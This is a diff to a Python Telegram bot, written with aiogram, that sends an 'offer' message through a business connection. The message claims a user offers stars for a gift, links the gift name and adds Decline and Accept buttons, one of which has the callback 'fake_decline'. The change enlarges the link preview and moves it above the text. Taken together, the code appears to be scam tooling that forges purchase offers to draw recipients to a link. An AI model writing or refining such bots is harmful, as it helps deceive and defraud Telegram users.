@@ -2,7 +2,7 @@ import asyncio
 import os
 import re
 from aiogram import Bot, Dispatcher, types, F
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
@@ -43,14 +43,15 @@ async def handle_offer_command(message: types.Message):
         pretty_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name) 
         username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
 
-        # Название подарка — кликабельная ссылка
+        # 3. Текст сообщения
+        # Ссылку вставляем прямо в текст. Telegram сам сделает её кликабельной.
         caption_text = (
             f"Пользователь ({username})\n"
             f"предлагает вам\n"
             f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
         )
 
-        # 3. Кнопки (ТОЛЬКО Отклонить и Принять)
+        # 4. Кнопки (только Отклонить и Принять)
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [
                 InlineKeyboardButton(text="Отклонить", callback_data="fake_decline"),
@@ -58,14 +59,18 @@ async def handle_offer_command(message: types.Message):
             ]
         ])
 
-        # 4. Отправляем сообщение
+        # 5. Отправляем сообщение с нативным превью НАД текстом
         await bot.send_message(
             chat_id=message.chat.id,
             text=caption_text,
             reply_markup=keyboard,
             business_connection_id=business_connection_id,
             parse_mode="HTML",
-            disable_web_page_preview=True
+            link_preview_options=LinkPreviewOptions(
+                url=link,                 # Ссылка, для которой генерируем превью
+                show_above_text=True,     # Карточка будет НАД текстом
+                prefer_large_media=True   # Крупный размер превью
+            )
         )
 
     except Exception as e:
